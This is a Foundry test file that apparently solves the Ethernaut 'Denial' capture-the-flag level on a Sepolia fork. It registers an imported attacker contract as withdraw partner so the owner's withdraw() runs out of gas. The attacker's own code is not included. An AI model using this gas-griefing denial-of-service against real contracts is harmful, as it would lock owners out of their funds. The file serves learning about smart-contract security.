// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {Attacker} from "../src/20-Denial/Attacker.sol";
// import {Denial} from "../src/20-Denial/20-Denial.sol";  // <== uncomment for testGasUsed

interface IDenial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function owner() external view returns (address);
}

contract TestDenial is Test{
    uint256 private constant GAS_LIMIT = 1_000_000;
    address private constant TARGET_ADDRESS = 0xce8d610F492a52030e2A1A848a5f2901cEadEffC;
    IDenial target;
    Attacker attackerContract;
    address attacker;
    address owner;
    // Denial d;  // <== uncomment for testGasUsed

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = IDenial(TARGET_ADDRESS);
        attackerContract = new Attacker();
        attacker = makeAddr("attacker");
        owner = target.owner();
        // d = new Denial();  // <== uncomment for testGasUsed
    }


    /**
     * Uncomment the Denial contract and all the commented codes in this file to run the below test and check the gas
     * NOTE : make sure to comment the ==> partner.call{value: amountToSend}(""); <== line because it execute infinite while loop which eventually kills the execution
     */
    // function testGasUsed() public {
    //     vm.prank(attacker);
    //     d.setWithdrawPartner(address(attackerContract));
    //     d.withdraw();
    // }

    function testDenial() public {
        vm.prank(attacker);
        target.setWithdrawPartner(address(attackerContract));

        vm.prank(owner);
        (bool success, bytes memory returnData) = address(target).call{gas: GAS_LIMIT}(
            abi.encodeCall(target.withdraw, ())
        );

        assert(!success);
        // run: forge test --mt testDenial -vvvvvvvvvv
        // it will throw EvmError: OutOfGas
    }
}